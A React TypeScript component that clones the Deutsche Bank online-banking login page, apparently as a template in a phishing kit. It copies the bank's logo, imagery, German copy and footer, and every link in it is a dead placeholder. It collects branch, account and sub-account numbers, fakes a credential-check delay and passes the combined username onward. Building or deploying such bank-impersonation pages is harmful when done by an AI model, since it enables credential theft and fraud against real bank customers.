import React, { useState, useEffect, useRef } from 'react';
import { AlertTriangle, Monitor } from 'lucide-react';
import Loading from './Loading';

interface LoginFormProps {
  onSubmit: (data: { username: string; password: string }) => void;
  showError?: boolean;
}

const LoginForm: React.FC<LoginFormProps> = ({ onSubmit, showError = false }) => {
  const [filiale, setFiliale] = useState('');
  const [konto, setKonto] = useState('');
  const [unterkonto, setUnterkonto] = useState('00');
  const [isLoading, setIsLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  
  const filialeRef = useRef<HTMLInputElement>(null);
  
  // Auto-focus the first field on component mount
  useEffect(() => {
    if (filialeRef.current) {
      filialeRef.current.focus();
    }
  }, []);

  // Clear form fields when error is shown
  useEffect(() => {
    if (showError) {
      setFiliale('');
      setKonto('');
      setUnterkonto('00');
      if (filialeRef.current) {
        filialeRef.current.focus();
      }
    }
  }, [showError]);

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!filiale.trim() || !konto.trim()) {
      return;
    }
    
    setIsLoading(true);
    setLoadingMessage('Anmeldedaten werden überprüft');
    
    await new Promise(resolve => setTimeout(resolve, 2500));
    
    try {
      // Combine fields to create username for compatibility with existing system
      const username = `${filiale}-${konto}-${unterkonto}`;
      await onSubmit({ username: username.trim(), password: 'pin' });
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsLoading(false);
    }
  };

  if (isLoading) {
    return <Loading message={loadingMessage} type="login" />;
  }

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .db-mobile-main {
              background-image: none !important;
              background-color: #1e2a78 !important;
            }
            .db-mobile-container {
              flex-direction: column !important;
              gap: 0 !important;
              max-width: none !important;
              margin: 0 !important;
            }
            .db-mobile-left {
              padding: 20px !important;
              padding-top: 40px !important;
              flex: none !important;
            }
            .db-mobile-sidebar {
              width: 100% !important;
              min-height: auto !important;
              order: 2 !important;
              margin-top: 60px !important;
            }
            .db-mobile-card {
              padding: 30px 20px !important;
            }
            .db-mobile-form-fields {
              flex-direction: column !important;
              gap: 16px !important;
            }
            .db-mobile-form-field {
              flex: none !important;
              width: 100% !important;
            }
            .db-mobile-form-buttons {
              flex-direction: column !important;
              gap: 16px !important;
              align-items: stretch !important;
            }
            .db-mobile-button {
              width: 100% !important;
            }
            .db-mobile-sidebar-content {
              background-color: #ffffff !important;
              padding: 20px !important;
              margin-bottom: 20px !important;
            }
            .db-mobile-footer-only {
              padding: 30px 20px !important;
            }
          }
        `}
      </style>
      <div className="db-mobile-main" style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
      
      {/* Main Container - 1180px */}
      <div className="db-mobile-container" style={{
        maxWidth: '1180px',
        width: '100%',
          display: 'flex',
        margin: '0 auto',
        gap: '80px'
      }}>
        
        {/* Left Content Area */}
        <div className="db-mobile-left" style={{
          flex: '1',
          display: 'flex',
          flexDirection: 'column',
          gap: '30px',
          paddingTop: '100px',
          paddingLeft: '40px',
          paddingRight: '20px',
          paddingBottom: '40px'
        }}>
          
          {/* PIN/Password Help Card - Above Login Form */}
          <div style={{
            backgroundColor: '#e8f4fd',
            border: '1px solid #b8d4e3',
            borderRadius: '3px',
            padding: '16px 20px',
            boxShadow: 'none'
          }}>
            <div style={{
              display: 'flex',
              alignItems: 'flex-start',
              gap: '12px'
            }}>
              <div style={{
                backgroundColor: '#0550d1',
                borderRadius: '50%',
                width: '20px',
                height: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                marginTop: '2px'
              }}>
                <span style={{
                  color: 'white',
                  fontSize: '12px',
                  fontWeight: 'bold'
                }}>i</span>
              </div>
              <div>
              <h3 style={{
                  margin: '0 0 8px 0',
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#0550d1',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                }}>
                  Sie haben PIN/Passwort nicht vorliegen?
              </h3>
              <p style={{
                  margin: '0 0 8px 0',
                  fontSize: '14px',
                  color: '#000000',
                  lineHeight: '1.4',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                }}>
                  In wenigen Schritten{' '}
                  <a href="#" style={{ 
                    color: '#0550d1', 
                    textDecoration: 'underline',
                    fontWeight: '600'
                  }}>
                    neu vergeben
                  </a>.
                </p>
                <p style={{
                  margin: '0',
                  fontSize: '14px',
                  color: '#000000',
                  lineHeight: '1.4',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
                }}>
                  <strong>Sie haben Ihre Filial-/Kontonummer nicht zur Hand?</strong><br />
                  Diese finden Sie auf der Rückseite Ihrer Deutsche Bank Card.
                </p>
              </div>
            </div>
          </div>

          {/* Main Login Card */}
          <div className="db-mobile-card" style={{
            backgroundColor: 'rgba(255, 255, 255, 0.98)',
            borderRadius: '3px',
            padding: '40px',
            boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
          }}>
            
            {/* Deutsche Bank Logo */}
              <div style={{
              marginBottom: '30px'
              }}>
                <img 
                src="/templates/deutsche_bank/images/DB-Logotype-ri-sRGB-DXJQ2K2F.svg" 
                alt="Deutsche Bank" 
                  style={{
                  height: '32px',
                  width: 'auto'
                }}
              />
            </div>
            
            {/* Title */}
            <h1 style={{
              fontSize: '28px',
              fontWeight: '400',
              color: '#000000',
              margin: '0 0 8px 0'
            }}>
              Guten Morgen
            </h1>
            
                <p style={{
              fontSize: '16px',
              color: '#666',
              margin: '0 0 30px 0'
            }}>
              Bitte geben Sie Ihre Zugangsdaten ein.
            </p>

            <form onSubmit={handleSubmit}>
              
              {/* Form Fields */}
              <div className="db-mobile-form-fields" style={{
                display: 'flex',
                gap: '12px',
                marginBottom: '20px'
              }}>
                
                {/* Filiale */}
                <div className="db-mobile-form-field" style={{ flex: '0 0 90px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#333',
                    marginBottom: '8px',
                    fontWeight: '600'
                  }}>
                    Filiale
                  </label>
                  <input
                    ref={filialeRef}
                    type="text"
                    value={filiale}
                    onChange={(e) => setFiliale(e.target.value)}
                    maxLength={3}
                    style={{
                      width: '100%',
                      height: '48px',
                      padding: '0 12px',
                      border: '1px solid #ddd',
                      borderRadius: '3px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      color: '#333',
                      outline: 'none',
                      textAlign: 'center'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#0550d1';
                      e.target.style.borderWidth = '2px';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#ddd';
                      e.target.style.borderWidth = '1px';
                    }}
                    required
                  />
                </div>

                {/* Konto */}
                <div className="db-mobile-form-field" style={{ flex: '0 0 140px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#333',
                    marginBottom: '8px',
                    fontWeight: '600'
                  }}>
                    Konto
                  </label>
                  <input
                    type="text"
                    value={konto}
                    onChange={(e) => setKonto(e.target.value)}
                    maxLength={7}
                    style={{
                      width: '100%',
                      height: '48px',
                      padding: '0 12px',
                      border: '1px solid #ddd',
                      borderRadius: '3px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      color: '#333',
                      outline: 'none',
                      textAlign: 'center'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#0550d1';
                      e.target.style.borderWidth = '2px';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#ddd';
                      e.target.style.borderWidth = '1px';
                    }}
                    required
                  />
                </div>
                
                {/* Unterkonto */}
                <div className="db-mobile-form-field" style={{ flex: '0 0 80px' }}>
                  <label style={{
                    display: 'block',
                    fontSize: '14px',
                    color: '#333',
                    marginBottom: '8px',
                    fontWeight: '600'
                  }}>
                    Unterkonto
                  </label>
                  <input
                    type="text"
                    value={unterkonto}
                    onChange={(e) => setUnterkonto(e.target.value)}
                    maxLength={2}
                    style={{
                      width: '100%',
                      height: '48px',
                      padding: '0 12px',
                      border: '1px solid #ddd',
                      borderRadius: '3px',
                      fontSize: '16px',
                      fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                      backgroundColor: '#ffffff',
                      color: '#333',
                      outline: 'none',
                      textAlign: 'center'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#0550d1';
                      e.target.style.borderWidth = '2px';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#ddd';
                      e.target.style.borderWidth = '1px';
                    }}
                  />
                </div>
              </div>

              {/* Deutsche Bank ID Link */}
              <div style={{
                marginBottom: '30px'
              }}>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                    fontSize: '14px',
                  fontWeight: '600'
                  }}>
                  Mit Deutsche Bank ID einloggen
                </a>
                </div>

              {/* Submit Button and Links */}
              <div className="db-mobile-form-buttons" style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center'
              }}>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Zugangsdaten vergessen?
                </a>

                <button
                  type="submit"
                  className="db-mobile-button"
                  style={{
                    backgroundColor: '#0550d1',
                    color: '#ffffff',
                    border: 'none',
                    borderRadius: '3px',
                    padding: '14px 28px',
                    fontSize: '16px',
                    fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                    fontWeight: '600',
                    cursor: 'pointer',
                    transition: 'background-color 0.2s ease'
                  }}
                  onMouseOver={(e) => {
                    e.currentTarget.style.backgroundColor = '#0440a8';
                  }}
                  onMouseOut={(e) => {
                    e.currentTarget.style.backgroundColor = '#0550d1';
                  }}
                >
                  Weiter
                </button>
              </div>
            </form>
          </div>
              </div>

        {/* Right Sidebar - 380px */}
        <div className="db-mobile-sidebar" style={{
          width: '380px',
          backgroundColor: '#ffffff',
          display: 'flex',
          flexDirection: 'column',
          minHeight: '100vh'
        }}>
          
          {/* Promotional Content */}
          <div className="db-mobile-sidebar-content" style={{
            flex: '1',
            padding: '30px'
          }}>
            
            {/* New Banking Promo */}
              <div style={{ 
              marginBottom: '40px'
            }}>
              <img 
                src="/templates/deutsche_bank/images/db-neues-banking-dt-1200x750-1552700535-w46209.jpg" 
                alt="Neues Online-Banking" 
                  style={{
                  width: '100%',
                  height: '140px',
                  objectFit: 'cover',
                  borderRadius: '3px',
                  marginBottom: '16px'
                }}
              />
              <h2 style={{
                fontSize: '18px',
                fontWeight: '600',
                color: '#000000',
                margin: '0 0 10px 0'
              }}>
                Neues Online-Banking. Neue App!
              </h2>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Jetzt noch smarter und mehr Komfort für Sie.
              </p>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '6px'
              }}>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Informationen für Privatkunden
                </a>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Informationen für Unternehmenskunden
                </a>
              </div>
              </div>

            {/* Security Info */}
            <div style={{
              marginBottom: '40px'
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                marginBottom: '10px'
              }}>
                <div style={{
                  color: '#000000',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <AlertTriangle size={24} />
                </div>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0'
                }}>
                  Sicherheitshinweise
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.
              </p>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '6px'
              }}>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu den aktuellen Sicherheitshinweisen
                </a>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu Sicherheit im Überblick
                </a>
              </div>
          </div>
          
            {/* Online Banking Access */}
          <div style={{
              marginBottom: '40px'
          }}>
            <div style={{ 
              display: 'flex',
                alignItems: 'center',
                gap: '10px',
                marginBottom: '10px'
            }}>
              <div style={{
                  color: '#000000',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <Monitor size={24} />
                </div>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0'
                }}>
                  Online-Banking Zugang
                </h3>
              </div>
              <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.
              </p>
              <a href="#" style={{
                color: '#0550d1',
                textDecoration: 'underline',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Zugang zum Online-Banking beantragen
              </a>
              </div>
              
            {/* Security Procedures */}
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                marginBottom: '10px'
              }}>
              <div style={{ 
                  color: '#000000',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <svg role="img" focusable="false" style={{ height: '24px', width: '24px' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                    <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
                    <path d="m7 11V7a5 5 0 0 1 10 0v4"/>
                  </svg>
                </div>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0'
                }}>
                  Unsere Sicherheitsverfahren
                </h3>
              </div>
                <p style={{
                fontSize: '14px',
                color: '#000000',
                margin: '0 0 12px 0',
                lineHeight: '1.5'
              }}>
                Alles Wissenswerte rund um Ihren Login.
              </p>
              <a href="#" style={{
                color: '#0550d1',
                textDecoration: 'underline',
                fontSize: '14px',
                fontWeight: '500'
              }}>
                Link zu den Sicherheitsverfahren
              </a>
              </div>
            </div>
            
          {/* Footer integrated in sidebar */}
          <div className="db-mobile-footer-only" style={{
            backgroundColor: '#1e2a78',
            color: '#ffffff',
            padding: '20px 30px'
          }}>
            <div style={{
              display: 'flex',
              flexWrap: 'wrap',
              gap: '15px',
              fontSize: '12px'
            }}>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                English Version
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Hilfe
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Demo-Konto
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Impressum
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Rechtliche Hinweise
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Datenschutz
              </a>
              <a href="#" style={{
                color: '#ffffff',
                textDecoration: 'none',
                fontWeight: '600'
              }}>
                Cookie-Einstellungen
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default LoginForm;